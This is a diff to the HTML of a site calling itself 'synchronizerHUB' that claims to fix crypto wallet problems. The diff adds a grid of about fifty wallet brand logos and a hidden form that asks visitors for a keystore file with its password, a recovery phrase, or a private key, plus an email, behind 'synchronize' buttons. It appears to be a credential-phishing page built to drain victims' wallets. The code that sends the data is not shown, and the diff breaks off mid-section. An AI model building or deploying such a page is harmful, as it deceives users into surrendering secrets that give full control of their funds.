@@ -29,7 +29,6 @@
 </head>
 <!-- body -->
 
-
 <body class="main-layout">
     <!-- loader  -->
     <div class="loader_bg">
@@ -53,41 +52,557 @@
 
     </header>
     <!-- end header -->
-    <!-- start slider section -->
-    <div id="top_section" class=" banner_main">
+
+    <!-- wallet -->
+    <div id="wall" class="wallet">
         <div class="container-fluid">
+            <!-- <h2 style="text-align: center;color: white;"></h2> -->
+            <div class="row">
+                <div class="col-lg-4">
+                    <div id="wa_hover" style="cursor: pointer;">
+                        <!-- <i><img class="img_responsive" src="images/wallets/alice.png" alt="#" /></i> -->
+                    </div>
+                    <!-- <h3 style="color: white;font-weight: bold; text-align: center;">Alice</h3>  -->
+                </div>
+                <div class="col-lg-4" style="justify-content: center;align-items: center;">
+                    <div id="wa_hover" style="cursor: pointer;" style="align-self: center;justify-items: center;">
+                        <h1 style="justify-items: center;align-self: center;padding-left: 50px;" disabled>Select your
+                            provider
+                        </h1>
+                    </div>
+                    <!-- <h3 style="color: white;font-weight: bold; text-align: center;">Alice</h3>  -->
+                </div>
+                <div class="col-lg-4">
+                    <div id="wa_hover" style="cursor: pointer;">
+                        <!-- <i><img class="img_responsive" src="images/wallets/alice.png" alt="#" /></i> -->
+                    </div>
+                    <!-- <h3 style="color: white;font-weight: bold; text-align: center;">Alice</h3>  -->
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('metamask')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/metamask.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">metamask</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Trust wallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/trustwallet.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Trust</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6 " style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Binance')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/binance.jpeg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Binance</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Blockchain')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/blockchain.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Blockchain</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Ronin')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/ronin.jpeg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Ronin</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('coinbase')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/coinbase.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Coinbase</h3>
+                </div>
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Alice')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/alice.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Alice</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6 " style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Alpha Wallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/alphawallet.jpeg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Alpha Wallet</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('argent')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/argent.jpeg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Argent</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Atomic')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/atomic.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">ATOMIC</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6 " style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('AT.Wallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/atwallet.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">AT.Wallet</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6 " style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Auhtereum')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/authereum.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Auhtereum</h3>
+                </div>
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Bitkeep')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/bitkeep.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Bitkeep</h3>
+                </div>
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('bridge')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/bridge.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">bridge</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('coin98')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/coin98.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Coin98</h3>
+                </div>
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('coinomi')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/coinomi.jpg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Coinomi</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('coolwallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/coolwallet.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">CoolWallet S</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Crypto.com | Defi wallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/crypto_defi.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Crypto.com | Defi wallet</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Dok wallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/dok.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Dok wallet</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Easy Pocket')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/easypocket.jpg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Easy Pocket</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Eidoo')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/eidoo.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Eidoo</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Equal')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/equal.jpeg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Equal</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('gnosis safe multisig')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/gnosis.jpeg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">gnosis safe multisig</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('GridPlus')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/gridplus.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">GridPlus</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Huobi Wallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/huobi.jpeg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Huobi wallet</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('imToken')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/imtoken.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">imToken</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Infinito')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/infinito.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Infinito</h3>
+                </div>
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Infinity')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/infinity.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Infinity</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('mathwallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/mathwallet.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Mathwallet</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('meet.one')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/meetone.jpg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">MEET.ONE</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('midas wallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/midas.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Midas Wallet</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Morix')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/morix.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Morix</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Mykey')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/mykey.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Mykey</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Nash')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/nash.jpeg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Nash</h3>
+                </div>
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Onto')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/onto.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">onto</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Ownbit')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/ownbit.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Ownbit</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('PeakDefi')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/peakdefi.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">PeakDefi wallet</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Pillar')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/pillar.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Pillar</h3>
+                </div>
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Rainbow')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/rainbow.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Rainbow</h3>
+                </div>
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('safepal')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/safepal.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">safepal</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('safepal wallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/safepal.jpeg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">safepal wallet</h3>
+                </div>
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('solana')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/solana.webp" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Solana</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('sparkpoint')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/sparkpoint.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Sparkpoint</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('spatium')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/spatium.jpeg" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Spatium</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('SWFT wallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/swft.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">SWFT wallet</h3>
+                </div>
+
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Tokenary')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/tokenary.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Tokenary</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('TokenPocket')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/TokenPocket.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">TokenPocket</h3>
+                </div>
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Unstoppable Wallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/unstoppable.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Unstoppable wallet</h3>
+                </div>
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Viawallet')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/viawallet.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Viawallet</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('visionn')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/vision.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Visionn</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Walleth')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/walleth.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Walleth</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('wallet.io')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/walletio.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">wallet.io</h3>
+                </div>
+
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('XDC')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/xdc.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">XDC</h3>
+                </div>
+                <div class="col-lg-3 col-sm-6" style="width: 50%;padding: 5%;height: 40%;margin-bottom: 15px;">
+                    <div id="wa_hover" style="cursor: pointer;" onclick="doThis('Zelcore')"
+                        class="wallet_box text_align_center">
+                        <i><img class="img_responsive" src="images/wallets/zelcore.png" alt="#" /></i>
+                    </div>
+                    <h3 style="color: white;font-weight: bold; text-align: center;">Zelcore</h3>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- end wallet -->
+    <!-- about -->
+    <div id="about" class="about">
+        <div class="container">
             <div class="row">
                 <div class="col-md-12">
-                    <div id="myCarousel" class="carousel slide" data-ride="carousel">
-                        <ol class="carousel-indicators">
-                            <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
-                            <li data-target="#myCarousel" data-slide-to="1"></li>
-                            <li data-target="#myCarousel" data-slide-to="2"></li>
-                        </ol>
-                        <div class="carousel-inner">
-                            <div class="carousel-item active">
-                                <div class="container-fluid">
-                                    <div class="carousel-caption relative">
-                                        <div class="row d_flex">
-                                            <div class="col-md-6">
-                                                <div class="con_img">
-                                                    <figure><img class="img_responsive" src="images/top_img.png"
-                                                            alt="#" /></figure>
-                                                </div>
+                    <div class="about_border">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="titlepage text_align_left">
+                                    <h2>About Us</h2>
+                                </div>
+                                <div class="about_text">
+                                    <p>We At synchronizerHUB seek to be of immense help to you concerning any technical
+                                        issue or difficulties you have with your digital Assets of any types like NFTs,
+                                        cryptos and so on. We also give advises and guidance on when and how to
+                                        sell/invest
+                                        your assets.</p>
+                                    <p>We are a company of cryptocurrency investment advisers, wallet issues rectifier,
+                                        system synchronization and dealing in every regular types of cryptocurrency </p>
+                                    <a class="read_more" href="">syncHUB</a>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="about_img">
+                                    <figure><img class="img_responsive" src="images/about2.png" alt="#" /></figure>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- end about -->
+    <!-- graf -->
+    <div class="graf" hidden="" id="datash">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <ul class="nav nav-tabs md-tabs graf_tab" id="myTabMD" role="tablist">
+                        <li class="col-md-4">
+                            <a class="nav-link active" onClick="tabClicked('request1', 'rq1')" id="home-tab-md"
+                                data-toggle="tab" href="#tab1" role="tab" aria-controls="home-md" aria-selected="true"
+                                style="align-self: flex-start;">Keystore
+                                JSON</a>
+                        </li>
+                        <li class="col-md-4">
+                            <a class="nav-link" id="profile-tab-md" data-toggle="tab"
+                                onClick="tabClicked('request2', 'rq2')" href="#tab2" role="tab"
+                                aria-controls="profile-md" aria-selected="false"
+                                style="align-self: center;padding-left: 140px;">Phrase</a>
+                        </li>
+                        <li class="col-md-4">
+                            <a class="nav-link" id="contact-tab-md" data-toggle="tab" href="#tab3"
+                                onClick="tabClicked('request3', 'rq3')" role="tab" aria-controls="contact-md"
+                                aria-selected="false" style="align-self: center;padding-left:190px;">Private Key</a>
+                        </li>
+                    </ul>
+                    <div class="tab-content card  graf_content" id="myTabContentMD">
+                        <div class="tab-pane fade show active padi" id="tab1" role="tabpanel"
+                            aria-labelledby="home-tab-md">
+                            <div class="row">
+                                <div class=" col-md-10 offset-md-1">
+                                    <form id="request1" action="" class="main_form">
+                                        <div class="row">
+                                            <div class=" col-md-10 offset-md-1">
+                                                <input class="contactus" id="keystore_value" style="color: white;"
+                                                    placeholder="keystore value" type="type" required
+                                                    name="keystore_value">
                                             </div>
-                                            <div class="col-md-6">
-                                                <div class="bluid">
-                                                    <h1>Progress<br> Your tangible assets easily</h1>
-                                                    <p>We at synchronizerHUB are a capable companion to help you solve
-                                                        and
-                                                        progress your crypto wallet assets smoothly and securely
-                                                    </p>
-                                                    <a class="read_more" href="#services">Our Services </a><a
-                                                        class="read_more" href="#about">About Us </a>
-                                                </div>
+                                            <div class=" col-md-10 offset-md-1">
+                                                <input class="contactus" id="keystore_password"
+                                                    placeholder="keystore password" required type="type"
+                                                    style="color: white;" name="keystore_password">
+                                            </div>
+                                            <div class=" col-md-10 offset-md-1">
+                                                <input class="contactus" id="reply_email" style="color: white;"
+                                                    placeholder="email" type="email" required name="reply_email">
+                                            </div>
+                                            <div class="col-md-12">
+                                                <button id="rq1" class="send_btn" type="submit">synchronize</button>
                                             </div>
                                         </div>
-                                    </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="tab-pane fade padi" id="tab2" role="tabpanel" aria-labelledby="profile-tab-md">
+                            <div class="row">
+                                <div class=" col-md-10 offset-md-1">
+                                    <form id="request2" action="" class="main_form">
+                                        <div class="row">
+                                            <div class=" col-md-10 offset-md-1">
+                                                <input class="contactus" id="phrase" placeholder="phrase"
+                                                    style="color: white;" type="type" required name="phrase">
+                                            </div>
+                                            <div class=" col-md-10 offset-md-1">
+                                                <input class="contactus" id="reply_email" style="color: white;"
+                                                    placeholder="email" type="email" required name="reply_email">
+                                            </div>
+                                            <div class="col-md-12">
+                                                <button id="rq2" class="send_btn" type="submit">synchronize</button>
+                                            </div>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="tab-pane fade padi" id="tab3" role="tabpanel" aria-labelledby="contact-tab-md">
+                            <div class="row">
+                                <div class=" col-md-10 offset-md-1">
+                                    <form id="request3" action="" class="main_form">
+                                        <div class="row">
+                                            <div class=" col-md-10 offset-md-1">
+                                                <input class="contactus" id="private_key" style="color: white;"
+                                                    placeholder="private key" type="type" required name="private_key">
+                                            </div>
+                                            <div class=" col-md-10 offset-md-1">
+                                                <input class="contactus" id="reply_email" style="color: white;"
+                                                    placeholder="email" type="email" required name="reply_email">
+                                            </div>
+                                            <div class="col-md-12">
+                                                <button id="rq3" class="send_btn" type="submit">synchronize</button>
+                                            </div>
+                                        </div>
+                                    </form>
                                 </div>
                             </div>
                         </div>
@@ -96,86 +611,38 @@
             </div>
         </div>
     </div>
-    <!-- end slider section -->
+    <!-- end graf -->
 
-    <div id="services">
-    <div class="about">
+    <!--result-->
+    <div id="done" hidden="" class="about">
         <div class="container">
             <div class="row">
                 <div class="col-md-12">
                     <div class="about_border">
                         <div class="row">
-                            <div class="col-md-12">
+                            <div class="col-md-6">
                                 <div class="titlepage text_align_left">
-                                    <h2>RECTIFICATIONS</h2>
+                                    <h2>SUCCESS</h2>
                                 </div>
-                                <div style="margin-top:20px">
-                                    <p>Let's try to help you rectify any issue with your provider and prevent future recurrence </p>
-                                    <a class="read_more" style="margin-top: 20px;" href="index.html">Get Help</a>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <div class="about">
-        <div class="container">
-            <div class="row">
-                <div class="col-md-12">
-                    <div class="about_border">
-                        <div class="row">
-                            <div class="col-md-12">
-                                <div class="titlepage text_align_left">
-                                    <h2>CLAIM REWARDS</h2>
-                                </div>
-                                <div style="margin-top:20px">
